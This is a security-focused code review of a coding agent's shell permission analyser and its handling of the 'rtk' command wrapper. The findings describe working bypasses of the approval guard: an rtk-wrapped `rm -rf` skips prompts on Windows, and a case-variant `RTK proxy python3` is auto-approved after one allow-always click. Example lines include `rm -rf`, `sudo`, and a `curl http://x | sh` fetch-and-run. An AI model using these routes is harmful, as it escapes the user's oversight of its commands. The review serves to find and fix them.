# Review: phase 6 — rtk, graphify, Skills Ecosystem Compatibility

Date: 2026-10-06
Branch: phase/6-rtk-graphify-ecosystem   Range: 5506c38..de5beb5 (8 commits, 42 files changed, +3233/−117)
Plan: docs/plans/phase-6-rtk-graphify-ecosystem.md   Spec: DESIGN.md §7, §9, §10, §13; SPECS.md §1, §11, §12, §15
Follows up: docs/reviews/2026-10-06-phase-5-mcp-lazy-proxy-pass-4.md

## Verdict

**Approve with fixes — 0 High · 3 Medium · 4 Low.** The phase delivers everything it
claims, its deviations from the plan are all recorded and check out against the code,
and the rtk laundering guarantee holds for every shape I could construct on Unix
(seven probes run). Three Medium findings remain: the Windows analyser bypasses the
entire shell rule set through an rtk wrapper (probe-confirmed), a case-variant
invocation (`RTK`/`Rtk`) lets one allow-always click launder all future case-variant
commands (probe-confirmed), and a vendored skill's license provenance rests on its own
frontmatter. None break a phase gate; all are small, localized fixes.

## Summary

Phase 6 adds rtk-aware unwrapping to the shell analyser (`rtk` is classified *and*
unwrapped; the runners `test`/`err`/`summary`/`run`/`proxy` classify their first
command word; shell-string options and unknown options refuse), pins the built-in rtk
skill to the real CLI, vendors a byte-exact ecosystem SKILL.md corpus (graphify,
Claude Code, pi, OpenCode + synthetic edge cases) with provenance and licenses,
hardens the frontmatter parser (folded/literal block scalars, quoted scalars, BOM/CRLF),
keeps not-yet-existing read-only jail roots, and proves prompt-template compatibility
with Claude Code and pi. Every deviation from the plan is recorded in the
Implementation notes and matches the code: the real rtk runs `test`/`err`/`summary`
with the command as the first positional word (`--` also works), so the plan's
three-class (`rtkProxy`/`rtkDashDash`) sketch was rightly replaced by one runner
class; the `.hash`-file re-extraction scheme was superseded by phase-2's already
content-hash-keyed extraction; the gate copied skills instead of symlinking
(symlinked skill dirs are skipped by design); the rtk skill description was sharpened
after the first live leg ran bare `go test`.

Counts: 0 High · 3 Medium · 4 Low. Code quality is consistent with phases 2–5:
fail-closed on anything the analyser cannot model exactly.

Cross-review note: a parallel adversarial pass-2 of this phase exists at
`docs/reviews/2026-10-06-phase-6-rtk-graphify-ecosystem-pass-2.md`. Its High finding
H1 (`--shell` appearing *after* the first positional word executes a shell command
string through the runner) does not reproduce on rtk 0.51.0 — I rebuilt its exact
probe: `rtk test echo hi --shell ./spy.sh 'MARKER'` runs `echo` with the remaining
tokens as **literal argv** (`hi --shell ./spy.sh MARKER`, spy never executed); the
string-executing form (`rtk test --shell ./spy.sh 'MARKER_A'`,
`rtk summary --shell … 'MARKER_C'`) fires only when `--shell` appears *before* the
positional word, and the analyser already refuses that (`rtk test --shell` →
"cannot analyse `rtk test --shell`: it runs a shell command string");
`rtk run --shell …` is rejected by rtk itself ("`--shell` cannot be used with
`[ARGS]...`"). The pass-2 Medium findings M2 (`--` then an option-shaped word) and M3
(case variants) do reproduce and are included here as Findings 4 and 2 (re-verified
by probe; the allow-always laundering chain in M3 is real). Only this document's
verdict and counts are final.

## Checks run

| Check | Result |
|---|---|
| `gofmt -l` (mise x go) | clean — no output |
| `go vet ./...` (mise x go) | clean — exit 0 |
| `go test ./... -race -count=1` (mise x go) | PASS — all 13 packages ok (12 with tests + `internal/permissions/probe` no-test), 0 failures |
| rtk class table vs the real CLI (rtk 0.51.0) | verified — probed `rtk --help` plus `rtk <sub> --help` for every `rtkSelf` entry (34) and every `rtkRun` runner (5); formats match the table exactly; the remaining ~49 subcommands are command wrappers, correctly classified via the wrapped-name rule; no hidden runner found |
| Probe: quoted/subshell first-word variants (8 cases) | `'rtk' proxy rm -rf /etc/x` correctly unwrapped (`every=[rm]`); `("rtk") …` / `('rtk') …` parse-refused; `(wrapper) cmd` correctly classifies only the wrapper — no Unix laundering shape found |
| Probe: rtk under transparent wrappers (overlay test) | `env rtk proxy python3 x` / `timeout 5 rtk proxy python3 x` / `time rtk …` all correctly unwrap to `need=[python3]` — wrapper-skipping and rtk unwrapping compose |
| Probe: case-variant + allow-always laundering (overlay test) | `RTK proxy python3 …` → `need=[RTK]`, one simulated allow-always of `RTK` → all subsequent `RTK proxy python3 …` auto-approved (`need=[]`) — the Medium-2 chain is real |
| Probe: pass-2's claimed H1 re-check (real CLI + spy script) | NOT reproduced — see the cross-review note above |
| Probe: `rtk env` secret exposure | no new capability: config-referenced env keys are already stripped from the shell env, and allowlisted `cat`/`grep` can read `/proc/self/environ` under the stated threat model (§7: permissions are guard rails, not a sandbox) |

Not verified:
- **Live-model gate legs** (recorded done in the plan's Implementation notes with
  scratch evidence directories at `~/.hermes/cache/scratch/moca_gate6/` and
  `moca_gate6live/`, both present and populated; per task constraints I did not
  re-run live API legs or spend live tokens): rtk preferred over a bare `go test` in
  a real session, the sharpened-description retry cycle, `rtk proxy python3` refusal
  verbatim, graphify skill read + `graphify query` from the committed graph,
  pi-subagents/skill-creator reads, the transient `[1210]` flake's failure mode.
- Provenance of the vendored corpus **against upstream**: all 12 SHA-256s in SOURCES.md
  match the vendored files byte-for-byte (verified with sha256sum), but I did not
  re-fetch `anthropics/skills` at the pinned commit or the npm packages to confirm those
  snapshots are faithful — this is self-consistency of SOURCES.md, not drift detection
  against the remote (also noted by the parallel pass-2).
- CI (GitHub Actions) run on the PR — network-dependent; the local checks above are the
  same gate set CI runs.

## Plan conformance

- **Task 1 (capture the rtk surface into a table)** — implemented, with a recorded deviation the
  plan's Implementation notes document and I have now independently confirmed against
  the real CLI: the plan's three-class sketch (`rtkSelf`, `rtkProxy`, `rtkDashDash`)
  describes a different CLI than the one installed — probes show
  `rtk test echo x` runs the command directly with no `--` (the sketch's "missing
  `--` → self" reading would have been a laundering hole; verified on the real CLI:
  `rtk test echo hi` runs `echo hi` — with an appended `MARKER_E`-shaped probe argv,
  the same positional word does reach the command). The implementation's `rtkRun`
  class (5 entries) + `rtkSelf` (34) + the wrapped-command default matches every
  subcommand's real shape (each runner's command is positional argv per
  `--help`; `--shell` exists only on the runners + `run`; `rtk run -c/--command` are
  string options and are refused). Fail-closed on unknown value-taking options and on
  anything newer than the table. **Conforms.**
- **Task 2 (unwrap in the analyser)** — `unwrap` (shell.go:303) returns the list of
  name-indexes to classify; transparent wrappers stay unclassified while `rtk` is
  classified *and* unwrapped; `rtkTarget` → `rtkSub` (flags before the sub) →
  `rtkRunTarget` (runners; `--` handled; unknown/value-taking option → refuse;
  nothing-left → self). Phase-2's wrapper and shell-analysis ladders pass unchanged
  under `-race`. The probe suite (`TestRtkUnwrap`) covers all five classes plus the
  requirement that `rtk` itself be allowlisted when it is absent from the list. **Conforms.**
- **Task 3 (ecosystem corpus)** — all 13 vendored SKILL.md files plus 4 supporting
  files present; SOURCES.md SHA-256s match the vendored files byte-for-byte
  (sha256sum); the `.gitattributes` `-text` pin holds (CRLF bytes exist only in
  synthetic/crlf/SKILL.md, the BOM only in synthetic/bom/SKILL.md); the 1,200-char
  description is exactly 1,200 chars and kept whole. All 13 expected.json entries load
  through Discover with the pinned name+description. Each parser fix the corpus forced
  (folded `>` blank-line folding, Go-style `strconv.Unquote` for double-quoted values,
  `''`→`'` for single-quoted) carries a focused unit test
  (`TestFrontmatterBlockAndQuoteEdges`). **Conforms.**
- **Task 4 (supporting files readable; rtk skill verified; built-ins re-extractable)** —
  `NewJail` switched from `EvalSymlinks`-fails to `resolveDeep` for read-only roots
  (dangling-symlink-handled, hop-bounded); `TestJailKeepsNotYetExistingReadOnlyRoot`
  pins it. `TestModelCanReadGlobalSkillSupportFiles` (agent_test.go) proves a
  post-Start skill dir's reference file is readable through the real read tool and
  that writes into it are refused. Extraction is content-hash keyed
  (`extractBuiltins(fsys,…)` + MapFS test `TestExtractBuiltinsReExtractsOnContentChange`).
  The built-in rtk SKILL.md's description/table/rules were revised and every
  subcommand name in it matches the real CLI. **Conforms.**
- **Task 5 (prompt-template compatibility)** — `TestEcosystemPromptsLoad` plus both
  fixtures; the `LoadPrompts` parser captures only `description`/`argument-hint` and
  ignores unknown top-level scalars (verified in code, not just in the test),
  satisfying the "unknown keys ignored" claim; positional/`$@`/`$ARGUMENTS`/`$$`
  expansion matches both ecosystems. **Conforms.**
- **Task 6 (docs + gates)** — `docs/external-tools.md` covers rtk/graphify/adopting
  other tools' skills and prompts with correct source paths, verified live:
  probed `graphify install --platform claude|pi|opencode` and confirmed
  `~/.claude/skills/graphify/` (byte-identical to the pi variant per SOURCES.md),
  `~/.pi/agent/skills/graphify/`, and `~/.config/opencode/skills/graphify/` all exist
  as written; the opencode variant's SKILL.md hash genuinely differs, exactly as the
  corpus records. Scratch gate artifacts were cleaned up after the probe; scratch HOME
  dirs restored to their pre-probe state. **Conforms; live-model gate legs were
  recorded by the implementer, not re-run here (see Not verified).**
- **Deviations** — runner-class unification, content-hash extraction, the jail
  resolveDeep fix, the copy-not-symlink gate deviation, and the description-sharpening
  are all recorded in Implementation notes and match the code. **Conforms.**
- **Phase gates** — the two explicit gates (rtk preferred + rtk cannot launder;
  graphify SKILL.md loads unchanged) ran with recorded evidence. **Conforms.**
- **Out-of-scope check** — nothing outside the phase's scope landed in the range; the
  only file outside the listed areas is the phase-5 plan's own gate-evidence line,
  which is documentation of the phase-5 live legs completing, not a code change.

## Review Focus

1. **`rtk` with flags before the subcommand** (`rtk -v git status`) — **satisfied**:
   `rtkSub` (rtk.go:75-86) skips flags before the subcommand;
   `TestRtkUnwrap` covers `-v` and `--ultra-compact` plus the runner-flag forms.
2. **`rtk proxy rm -rf x` / `rtk test -- sudo make`** — **satisfied on Unix**: both
   unwrap to `rm` (every-time) / `sudo` (hard-deny) and are covered in
   `rtk_test.go`; the pass-2's claimed `--shell`-after-positional laundering variant
   does not reproduce (see the Summary's cross-review note). On Windows the gap is
   real and confirmed → Finding 1.
3. **Unquoted `description` containing `: `** — **satisfied**: the frontmatter parser's
   first-`:`-cut keeps the full tail
   (frontmatter.go:33-37); pinned by the `synthetic/colon-unquoted` corpus entry and
   expected.json.
4. **Skill supporting files readable; scripts only if `bash` allowlisted** —
   **satisfied**: the read-only root covers the whole skill dir — confirmed by the
   code (searching: the read-only root is a directory prefix, not a per-file allow) and
   `TestModelCanReadGlobalSkillSupportFiles` (read through the real tool, write
   refused). The second half (running a support script via `shell` needs `bash` to be
   allowlisted) is enforced by the general analyser (any `bash …` must pass `Check`
   regardless of what a skill's text suggests) — no special case exists or is needed.
5. **Claude Code command file / pi prompt template load; unknown keys ignored;
   `$ARGUMENTS` expands** — **satisfied** by `TestEcosystemPromptsLoad` +
   `prompts_test.go`'s existing expansion tests; the unknown-key-ignoring property is
   confirmed in the parser code itself (only `description`/`argument-hint` are
   captured).

## Findings

### Medium

#### 1. The Windows analyser does not unwrap rtk, so `rtk proxy rm -rf …` bypasses the ask-every-time `rm` prompt there — Confirmed
`internal/permissions/shell_windows_rules.go:15-33` (dispatch: `internal/permissions/shell.go:357-359`)

`Check` dispatches to `checkWindows` before any Unix unwrapping; the Windows branch
classifies only the first word of each segment, so with `rtk` allowlisted,
`rtk proxy rm -rf …`, `rtk proxy sudo …` and `rtk proxy python …` classify just `rtk`
and run without any prompt. Probe (overlay test, since removed):
`NewShell([rtk], goos=windows).Check("rtk proxy rm -rf x")` → `need=[] every=[]`;
the identical input with `goos=linux` → `every=[rm]`.

Failure scenario: on Windows, a prompt-injected or mistaken model asks for
`rtk proxy rm -rf <dir>` — moca runs it with no `rm` prompt, where the same command
on Linux prompts every time. The Windows analyser is documented weaker than Unix
(DESIGN §7, SPECS §11), and bare `rm` is already in `winAsk` — the gap is
specifically the rtk-wrapped form, which is new in this phase.

Proposed fix: the smallest honest change is to make Windows fail closed for rtk —
refuse any Windows command whose first word is `rtk` when it has arguments (rtk stays
usable for its own zero-arg subcommands). A fuller fix mirrors the `rtkRun`
first-positional-word rule in the Windows segment walker.

#### 2. A case-variant invocation (`RTK`/`Rtk`) skips the rtk unwrap, and one allow-always click launders every later case-variant command — Confirmed
`internal/permissions/shell.go:311-322` (the `switch filepath.Base(name)` in `unwrap`) and `internal/permissions/rtk.go:75` (same casing in `rtkSub`)

The unwrap switch is case-sensitive: `RTK proxy python3 -c '…'` falls to the default
arm, so only `RTK` is classified. The non-literal guard does not help (an option-free
invocation stays literal); the user gets asked about `RTK` once, and if they answer
allow-always, every later `RTK proxy python3 …` line is auto-approved with only
`RTK`+`Proxy` classified — `python3` never checked. Probe:
`Check("RTK proxy python3 -c 'print(1)'")` → `need=[RTK]`; simulate allow-always by
adding `RTK` to the allow set → `need=[] err=nil` afterwards. `Allow()` lowercases
newly allowlisted names too, which makes the second behaviour class-dependent rather
than casing-dependent — the analyser has no case-normalization of the command name
itself.

Failure scenario: a model (or injected prompt) issues `RTK proxy python3 -c 'fetch
http://x'`; the user clicks allow-always once, expecting to be approving the rtk
binary — all future case-variant commands then run with no per-command analysis.

Proposed fix: compare `strings.ToLower(filepath.Base(name))` in `unwrap`'s wrapper
switch and in `rtkSub`/`rtkRunTarget` (and mirror in `classify` so the allow set and
the TUI prompt show the actual spelling while the check itself is case-normalized on
Unix, where PATH lookup is case-sensitive — matching what Bash actually resolves also
implies refusing an unknown-case name rather than neutralizing it; the minimal safe
form is: unwrap only on exact `rtk`, but **refuse** a wrapper-looking name that
differs only in case from a known wrapper). Add `RTK proxy python3` / `Rtk proxy …`
rows to `rtk_test.go` with deny expectations.

#### 3. One vendored skill's license provenance rests on its own frontmatter rather than a pinned upstream source — Plausible
`internal/skills/testdata/ecosystem/SOURCES.md:17`

Five of six vendored skills pin an upstream URL + commit/package version, and three
carry upstream LICENSE files. `opencode/dotnet-unit-testing` instead says "the moca
author's dotfiles … MIT (declared in the skill's frontmatter)" — the license claim
cannot be audited from the repo alone, and its version/pin column is "—". Not
suspected wrong; flagged as the weakest evidence chain in an otherwise exemplary
SOURCES.md (this is also the pass-2's Low-5 point, restated here as Medium because
license provenance of a vendored third-party file is not merely test hygiene).

Failure scenario: none at runtime. A future license audit of the corpus hits "we
trust the file's own frontmatter about its license" for one of six skills.

Proposed fix: record the upstream URL/commit for that file in SOURCES.md (as the
claude-code rows do), or swap it for a skill from a pinned repository.

### Low

#### 4. After `--`, an option-shaped word is classified as a command name rather than refused — Confirmed
`internal/permissions/rtk.go:102-106`

`rtkRunTarget` returns the index after `--` unconditionally, so `rtk test -- -c`
classifies `-c` as needing allowlist and `rtk test -- --shell` classifies `--shell`
as a command. Today rtk itself errors out in both shapes (`command is required`),
so nothing is laundered now; but the analyser has already bless-shaped a
`-c`/`--shell` literal as a "command name", which is a trap for a future rtk that
accepts `rtk run -- -c '<string>'` argv.

Failure scenario (future-version): a newer rtk accepts `-c` after `--`; the model
runs `rtk test -- -c 'curl http://x | sh'` and the analyser, having classified `-c`
once (possibly allow-always), no longer guards the string.

Proposed fix: refuse the whole command when the word after `--` starts with `-`
(same fail-closed philosophy as the unknown-option arm), instead of classifying it.
Add `rtk test -- -c` / `rtk test -- --shell` rows with deny expectations.

#### 5. SOURCES.md's byte-for-byte claim is not enforced by any test — Confirmed (test gap)
`internal/skills/testdata/ecosystem/SOURCES.md:43-56` (+ `ecosystem_test.go`)

The only byte guards in the corpus test cover the two fixtures that depend on exact
bytes (CRLF, BOM). Nothing recomputes the SHA-256 column in SOURCES.md against the
corpus directory, so an accidental edit (or a rename-plus-edit) of any vendored file
passes CI until someone re-reads the hashes. My sha256sum spot-check above confirms
current consistency; that is a one-time manual step.

Failure scenario: a contributor edits a vendored SKILL.md "just slightly" to debug a
parser case, forgets to revert; the corpus now differs from its pinned hashes and
SOURCES.md silently lies.

Proposed fix: a small test that parses the hash lines out of SOURCES.md and
recomputes them over the files (few lines, no third-party deps).

#### 6. `expected.json` drives the corpus count only in aggregate — Confirmed (test hygiene, no live bug)
`internal/skills/ecosystem_test.go:50-52`

The test asserts `seen != len(expected)` at the end. A skill directory that
disappears while another appears under the same source could keep the aggregate
equal while a specific expected entry silently vanished. With 13 distinct keys today
and no churn, this is practically unreachable — noted so the harness cannot regress
into a weaker check by accident.

Failure scenario: none today; only under a coincidental equal-count edit.

Proposed fix: drive the loop from `expected.json`'s keys and assert each one was
seen (mirroring the existing direction of the loop).

#### 7. `rtk smart -m <model>` is classed rtkSelf while the `--model` value is user-supplied — Confirmed, benign on rtk 0.51.0
`internal/permissions/rtk.go:41`

`smart` is in `rtkSelf`; its `--model` accepts a value with `heuristic` as the
default, and probing showed no execution path reaches that value on this version. If
a future rtk adds a model-download hook that executes the `--model` value, the
rtkSelf class would have blessed it in advance.

Failure scenario (future-version): a newer rtk treats `--model <path>` as an
executable or a script to run; the analyser still classifies `smart` alone.

Proposed fix: none now — the existing "Re-check when bumping the rtk version" comment
contract on the table is the intended mechanism. Optionally, pin `rtk smart --help`
output as a fixture so a version bump shows a diff instead of a silent semantic change.

## Earlier findings

- **Phase-5 reviews (passes 1–4)** — every finding was confirmed fixed with
  regression tests per those documents; this phase touches nothing in
  `internal/mcp`, and no phase-5 behaviour regressed (the full `-race` run is green).
- **Phase-2 finding 2** (wrapper-option parsing hiding the real command) — the
  guarantee is now extended to rtk, the one wrapper whose second word can be a fresh
  command the phase-2 set did not cover; the wrapper-option fail-closed philosophy is
  preserved (`skipWrapperOpts` is reused rather than reimplemented). No regression in
  the original wrapper set (`env`/`time`/`timeout`/`nice`/`nohup`/`command` still fail
  closed on unmodelled options — the phase-2 ladder passes unchanged).
- **Phase-2 finding 15** (`internal/permissions/probe/` untracked leftover): the
  directory now sits inside the module as a tracked, testless package (it shows up as
  `?` in `go test ./...`, `vet`-clean). The "untracked leftover" concern is resolved
  by it being tracked; no action needed.
- **Phase-2 finding 1** (dangling-symlink write escape) — untouched by this phase;
  the test remains green in the full run.

## Suggested order of fixes

1. **Finding 2** (case-variant laundering) — smallest diff with the biggest
   permission-surface effect: case-normalize (or refuse case-variants of) the
   wrapper names in `unwrap`/`rtkSub` and mirror it in `classify`; add the
   `RTK`/`Rtk` rows plus the allow-always regression test.
2. **Finding 1** (Windows rtk gap) — refuse rtk-with-arguments on Windows (or mirror
   `rtkRun` there); add the `rtk proxy rm/sudo/python` Windows ladder to the test
   file so the guarantee is testable rather than documented.
3. **Finding 3** (provenance) — pin opencode/dotnet-unit-testing's upstream in
   SOURCES.md or swap the skill.
4. **Finding 4** (refuse an option-shaped word after `--`) — plus tests.
5. **Finding 5** (SOURCES.md hash test) — plus the by-expected-keys loop of Finding 6.

**Not verified** lives in the Checks-run section above (live-model gate legs,
upstream bytes of the vendored corpus at the pinned commits, CI).
